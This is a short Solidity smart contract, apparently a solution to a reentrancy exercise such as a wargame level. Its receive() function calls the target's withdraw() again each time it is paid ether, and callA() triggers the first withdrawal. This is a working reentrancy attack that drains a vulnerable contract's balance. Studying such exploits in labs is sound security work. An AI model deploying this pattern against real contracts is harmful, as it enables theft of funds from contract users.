// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;


interface IReentrance {
    function withdraw(uint256 _amount) external;
}

contract ContractB {
    IReentrance public target;

    constructor (address _contractAAddress) {
    	target = IReentrance(_contractAAddress);
	}

    
    function callA() public  {
        target.withdraw(1000000000000000);
    }

    receive() external payable {
        target.withdraw(1000000000000000);
    }
}